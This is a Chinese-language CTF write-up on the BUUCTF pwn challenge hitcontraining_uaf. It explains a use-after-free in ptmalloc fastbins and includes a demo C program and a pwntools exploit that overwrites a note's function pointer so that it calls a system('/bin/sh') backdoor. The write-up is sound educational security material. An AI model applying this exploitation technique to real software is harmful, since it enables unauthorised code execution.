# [BUUCTF-Pwn]hitcontraining_uaf

以此题作为对Pwn中堆利用的学习的开始。堆题初见，肯定有许多地方理解不恰当，希望师傅们能多多指教。

## 0x00.简述

成因

```
应用程序调用free()释放内存时，如果内存块小于256kb，ptmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放回内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当ptmalloc中空闲内存量达到一定值时ptmalloc才将空闲内存释放回内核。如果应用程序申请的内存大于256kb，ptmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，ptmalloc马上调用munmap()释放内存。ptmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。
```

示例程序

```
#include <stdio.h>
#include <stdlib.h>
typedef void (*func_ptr)(char *);
void evil_fuc(char command[])
{
system(command);
}
void echo(char content[])
{
printf("%s",content);
}
int main()
{
    func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));
    printf("malloc addr: %p\n",p1);
    p1[3]=echo;
    p1[3]("hello world\n");
    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针
    p1[3]("hello again\n"); //p1指针未被置空,虽然free了,但仍可使用.
    func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.
    printf("malloc addr: %p\n",p2);
    printf("malloc addr: %p\n",p1);//p2与p1指针指向的内存为同一地址
    p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.
    p1[3]("/bin/sh");
    return 0;
}
```

运行结果

![image-20210405011515386](https://i.loli.net/2021/04/05/FhCULk1ojsqrElM.png)

## 0x01.检查保护

![image-20210405004832680](https://i.loli.net/2021/04/05/nLGDV2BWOkbp4MA.png)

## 0x02.静态分析

![image-20210405004924203](https://i.loli.net/2021/04/05/tIx98Z4EoaumMlj.png)

经典菜单题，进入add_note函数查看，一次只能add一个结点，最多add5个

容易观察到notelist其实是一个结构体数组，大小为8个字节，其第一个成员为函数指针（4字节），指向print_note_content函数，其第二个成员也为一个指针（4字节），指向后续malloc指定大小的空间，因此在ida中的Structures窗口添加如下结构体定义

![image-20210405005450799](https://i.loli.net/2021/04/05/aRofvOPjrcDsbLV.png)

将notelist的类型声明改为如下所示

![image-20210405005618871](https://i.loli.net/2021/04/05/N6uSbaK3t1OUhZT.png)

优化效果：

![image-20210405005649970](https://i.loli.net/2021/04/05/VK6Y3fsrWIuivPa.png)

再看del_note函数，作用是删除指定下标的结点

![image-20210405011620907](https://i.loli.net/2021/04/05/KpBDCIAOJvgjQy1.png)

未将指针置空，存在uaf漏洞

print_note函数，打印指定下标的结构体中buf的内容

![image-20210405011959024](https://i.loli.net/2021/04/05/FK7T2ON9kVtIzcM.png)

在这个函数中会执行notelist结构体中第一个指针指向的函数，我们如果能把指针改为指向system("/bin/sh")函数，就能获得权限

后门：

![image-20210405175442208](https://i.loli.net/2021/04/05/JSjwTvHbFuzdWLZ.png)

## 0x03.动态调试

我们申请了两个结构体

![image-20210405172903922](https://i.loli.net/2021/04/05/ipykSwE2vOCW9mN.png)

堆中情况如下：

![image-20210405172800928](https://i.loli.net/2021/04/05/QXLfoibEMDW23zh.png)

释放：

![image-20210405173025365](https://i.loli.net/2021/04/05/s3GQluib1JMf9LD.png)

堆中：

![image-20210405173052094](https://i.loli.net/2021/04/05/5sXEqM9jKZkVa2O.png)

bins:

![image-20210405173116497](https://i.loli.net/2021/04/05/2oJmPrzjXgHqIlE.png)

## 0x04.思路

可以看到其实free过后只是更改了fd处的四个字节（插入到fastbin链表中），并没有”真正的释放“

本来，在buf(size为0x41的堆块)中fd对应的四个字节其实就是用户输入的内容的前四个字节，在指针型结构体(size为0x17的堆块)中fd对应的是print指针，即print_note_content函数的地址。现在，free过后，他们都被更改。

此时如果我们再申请一个结构体并在其内部给buf分配8字节的堆空间，就会用到fastbins中大小为0x10的两个堆

fastbin先进后出，所以原来的1号堆对应现在的指针型结构体，0号堆对应现在的buf，由于我们现在可以向buf中写东西，所以如果我们向buf中前四个字节处（也就是fd处）写入magic函数的地址，再次调用print函数尝试输出0号堆的内容时，它以为前四个字节(fd处的四个字节)是print_note_content函数的地址，而实际是magic函数的地址，所以执行的是magic函数，也就是system("/bin/sh")

简单说来，就是我们在最后print的是编号为0的堆块，它虽然已经被free掉了，但是指向它的指针没有置为null，指针仍然指向它，那么我们再通过该指针来调用它的时候，就会调用magic函数

## 0x05.exp

exp如下：

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
p = process('./hacknote')

def addnote(size, content):
    p.recvuntil("choice :")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(content)

def delnote(index):
    p.recvuntil("choice :")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(index))

def printnote(index):
    p.recvuntil("choice :")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(index))

#gdb.attach(p)
magic_addr = 0x08048945
addnote(0x30, 'aaaa')
addnote(0x30, 'bbbb')
delnote(0)
delnote(1)
addnote(8, p32(magic_addr))
printnote(0)
p.interactive()
```

